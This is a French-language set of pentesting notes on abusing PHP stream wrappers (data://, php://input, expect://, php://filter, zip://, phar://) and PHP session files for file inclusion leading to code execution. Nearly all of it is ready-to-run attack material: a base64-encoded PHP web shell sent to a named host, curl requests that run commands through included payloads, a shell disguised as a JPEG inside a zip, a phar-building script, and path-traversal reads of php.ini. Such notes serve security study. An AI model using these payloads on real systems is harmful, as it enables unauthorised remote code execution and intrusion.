# Wrappers
Méthode d'accéder à des ressources de différentes façon. Sert donc à faire comme si on lisait un fichier?
### data://
Peut  exécuter du code en texte brute ou encoder (base64, ...)
Nécessite allow_url_include dans la config PHP
config Apache:
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
config Nginx:
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2//etc/php/X.Y/fpm/php.ini
			
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### php://input
comme data mais reçois en POST
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### expect://
Exécute commandes
Pas installé par défaut, mais plusieurs applications s'en servent. Rechercher dans le fichier de config comme data pour “expect” et savoir si il est installé
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### php://filter
Applique des filtres sur la sortie. Lire des fichiers. Utiliser fuzzeur pour trouver fichiers ou lire code pour trouver des  inclusions
```
php://filter/convert.base64-encode
```
encode en base 64 ce qui permet d'afficher un fichier sans l'exécuter
php://filter/read=convert.base64-encode/resource=admin.php
			
### zip://
Pas actif par défaut. Permet de dézipper une charge.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

curl 'http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### phar://
créer un script PHP. PHAR peut utiliser n'importe quelle extension
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
#
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$phar->stopBuffering();
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

compiler en phar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Téléverser puis référencer le shell.txt	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#### Désérialization < PHP 8.1
Possible d'exécuter du code lors de la désérialization. 
* Doit connaître le nom d'une classe dans l'application vulnérable.
* La classe doit utiliser \__construct ou \__destruct
https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization

# PHP Session
* /var/lib/php/sessions/sess\_\[cookie_PHPSESSID]
* C:\Windows\Temp\sess\_\[cookie_PHPSESSID]

Ajouter du code d'une quelquonque façon dedans puis

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
curl 'http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~